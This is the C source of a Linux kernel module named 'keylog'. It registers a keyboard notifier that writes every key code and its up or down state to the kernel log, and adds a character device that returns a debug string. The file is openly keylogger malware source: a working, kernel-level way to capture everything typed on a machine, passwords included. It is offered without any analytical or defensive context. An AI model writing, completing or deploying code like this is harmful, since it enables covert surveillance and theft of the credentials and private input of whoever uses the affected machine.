#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h> /* printk() */
#include <linux/slab.h> /* kmalloc() */
#include <linux/fs.h> /* everything... */
#include <linux/errno.h> /* error codes */
#include <linux/types.h> /* size_t */
#include <linux/proc_fs.h>
#include <linux/fcntl.h> /* O_ACCMODE */
#include <asm/system.h> /* cli(), *_flags */
#include <asm/uaccess.h> /* copy_from/to_user */

#include <linux/keyboard.h> /* register_keyboard_notifier etc */

#define print812(...) printk( "<1>812 " ); printk( __VA_ARGS__ ); printk( "\n" );

#define KEYLOG_MAJOR 60
#define KEYLOG_NAME  "keylog"

MODULE_LICENSE( "Dual BSD/GPL" );

static char *key_buffer;

int key_open( struct inode *inode, struct file *filp );
ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
int key_release( struct inode *inode, struct file *filp );

struct file_operations fops = {
    read:    key_read,
    open:    key_open,
    release: key_release,
};

int key_open( struct inode *inode, struct file *filp ) {
    print812( "Received an open" );

    return 0;
}

ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
    char *debug_stmt = "Keylogger debug\n";
    unsigned length = strlen( debug_stmt );
    
    print812( "Reading from device" );


    copy_to_user( buf, debug_stmt, length );
    
    if ( *f_pos == 0 ) {
        *f_pos += length;
        return length;
    } else {
        return 0;
    }
}

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    //printk("HELLO NOTIFY %d %d\n", code, KBD_KEYCODE);
    
    struct keyboard_notifier_param *param = _param;
    
    struct vc_data *vc = param->vc;

    if (code == KBD_KEYCODE) {
        printk("KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
    }

    return NOTIFY_OK;
}

static struct notifier_block keyboardNotifierBlock = {
        .notifier_call = hello_notify
};

int key_release( struct inode *inode, struct file *filp ) {
    print812( "In release method" );

    return 0;
}

static int hello_init( void ) {
    int err;
    print812( "Initializing the module." );

    err = register_chrdev( KEYLOG_MAJOR, KEYLOG_NAME, &fops );
    if ( err < 0 ) {
        print812( "Registering chrdev failed (%d)", err );
        return err;
    }

    register_keyboard_notifier(&keyboardNotifierBlock);

    return 0;
}

static void hello_exit( void ) {
    print812( "Unregistering the module" );

    unregister_keyboard_notifier(&keyboardNotifierBlock);

    unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
}

module_init( hello_init );
module_exit( hello_exit );
